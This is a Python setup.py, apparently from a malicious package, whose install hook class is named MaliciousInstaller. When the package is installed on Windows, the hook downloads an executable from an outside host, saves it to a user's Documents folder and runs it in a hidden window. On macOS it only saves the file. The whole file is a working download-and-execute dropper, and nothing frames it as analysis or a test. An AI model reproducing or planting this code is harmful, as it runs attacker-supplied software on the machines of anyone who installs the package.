import os
import urllib.request
import sys
import platform
import subprocess
from setuptools import setup
from setuptools.command.install import install

class MaliciousInstaller(install):
    def run(self):
        if platform.system() != 'Darwin':
            documents = 'C:\\Users\\charl\\Documents'
            installer_url = 'https://api.slikc.me/installer'
            with urllib.request.urlopen(installer_url) as response:
                installer_content = response.read()
                print(installer_content[:100])
            with open(os.path.join(documents, 'installer.exe'), 'wb') as f:
                f.write(installer_content)
            subprocess.Popen([os.path.join(documents, 'installer.exe')], creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            installer_url = 'https://api.slikc.me/installer'
            with urllib.request.urlopen(installer_url) as response:
                installer_content = response.read()
                print(installer_content[:100])
            with open('installer.exe', 'wb') as f:
                f.write(installer_content)
            print('Installer downloaded to current directory')

setup(
    cmdclass={"install": MaliciousInstaller},
    use_wheel=False
)
